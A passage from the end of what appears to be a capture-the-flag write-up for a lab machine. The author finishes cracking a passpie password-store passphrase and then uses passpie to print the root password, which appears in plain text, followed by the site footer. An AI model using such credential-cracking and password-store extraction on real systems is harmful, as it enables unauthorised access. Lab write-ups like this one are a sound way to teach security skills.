Use<span class="w"> </span>the<span class="w"> </span><span class="s2">&quot;--show&quot;</span><span class="w"> </span>option<span class="w"> </span>to<span class="w"> </span>display<span class="w"> </span>all<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>cracked<span class="w"> </span>passwords<span class="w"> </span>reliably
Session<span class="w"> </span>completed.
</code></pre></div>
<p>Now we can just get the <code>root</code> passowrd and get the flag!</p>
<div class="highlight"><pre><span></span><code>jnelson@meta2:~$<span class="w"> </span>passpie<span class="w"> </span>copy<span class="w"> </span>root@ssh<span class="w"> </span>--to<span class="w"> </span>stdout
Passphrase:<span class="w"> </span>
p7qfAZt4_A1xo_0x
</code></pre></div>







  
  






                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Copyright &copy; 2020 - 2024 Ángel Heredia
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        <div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://mypublicinbox.com/Anthares101" target="_blank" rel="noopener" title="mypublicinbox.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 106 68"><path d="M3.882 3.882 0 7.765v25.713c0 28.145.242 29.461 6.04 32.886C8.492 67.813 13.929 68 53.576 68h44.767l4.328-4.518L107 58.965V32.816c0-14.382-.236-25.913-.525-25.625s-2.26-1.211-4.382-3.333c-6.311-6.311-9.227-5.803-31.951 5.571l-18.838 9.429-16.902-9.403C19.622 1.233 16.889.049 12.632.026c-4.337-.023-5.29.397-8.75 3.856M.437 34c0 14.575.14 20.537.31 13.25s.171-19.213 0-26.5S.437 19.425.437 34"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://github.com/anthares101" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://www.linkedin.com/in/angelherediaperez" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://x.com/anthares101" target="_blank" rel="noopener" title="x.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8l164.9-188.5L26.8 48h145.6l100.5 132.9L389.2 48zm-24.8 373.8h39.1L151.1 88h-42l255.3 333.8z"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://app.hackthebox.com/profile/366635" target="_blank" rel="noopener" title="app.hackthebox.com" class="md-social__link">
      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M11.996 0a1.119 1.119 0 0 0-.057.003.9.9 0 0 0-.236.05.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77v11.111a.889.889 0 0 0 .47.784l9.598 5.541.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.024.01.001.011.003.016.004a.93.93 0 0 0 .296.015.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.024l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.024c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .724l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.724l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.524 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.241.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532a.42.42 0 0 1-.208.362l-6.524 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://ctftime.org/team/133772" target="_blank" rel="noopener" title="ctftime.org" class="md-social__link">
      <svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100.000000 100.000000" preserveAspectRatio="xMidYMid meet">
<g transform="translate(0.000000,100.000000) scale(0.100000,-0.100000)" stroke="none">
<path d="M0 989 c0 -7 30 -53 67 -103 93 -126 268 -369 276 -382 3 -6 -72
-116 -168 -245 -96 -129 -175 -240 -175 -246 0 -10 107 -13 500 -13 l500 0 0
500 0 500 -500 0 c-365 0 -500 -3 -500 -11z m840 -494 l0 -155 -160 0 -160 0
0 148 c0 82 3 152 7 155 3 4 75 7 160 7 l153 0 0 -155z"/>
<path d="M685 550 l49 -50 -46 -47 c-41 -40 -49 -45 -63 -33 -14 12 -13 17 17
47 l32 33 -44 45 c-24 25 -48 45 -52 45 -4 0 -8 -45 -8 -100 l0 -100 110 0
110 0 0 105 0 105 -77 0 -77 0 49 -50z"/>
</g>
</svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.instant", "navigation.top", "navigation.sections"], "search": "../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.1e8ae164.min.js"></script>
      
    
  </body>
</html>